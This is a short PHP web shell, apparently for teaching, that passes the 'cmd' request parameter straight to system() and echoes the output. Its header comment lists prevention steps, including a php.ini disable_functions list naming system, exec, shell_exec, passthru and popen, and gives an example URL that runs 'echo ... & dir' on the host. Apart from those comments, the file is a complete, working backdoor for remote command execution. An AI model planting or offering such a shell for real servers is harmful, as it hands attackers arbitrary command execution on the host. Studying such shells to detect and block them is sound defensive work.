<?php
#######################################
# PREVENTION
# Disable dangerous PHP functions
# php.ini -> disable_functions=system,exec,shell_exec,passthru,popen
# Input validation / command filtering
# Web server least privilege
# Web Application Firewall
######################################
# EXAMPLE USAGE: phpshell.php?cmd=echo+COMMAND%20HERE+%26+dir
# EXAMPLE COMMAND OUTPUT: echo COMMAND HERE & dir
#######################################
# Check for cmd parameter
if (isset($_REQUEST["cmd"])) {
# Preformatted output
echo "<pre>";
# Get command
$cmd = $_REQUEST["cmd"];
# Execute command
system($cmd);
# Close output
echo "</pre>";
# Stop script
die;}
#######################################
?>
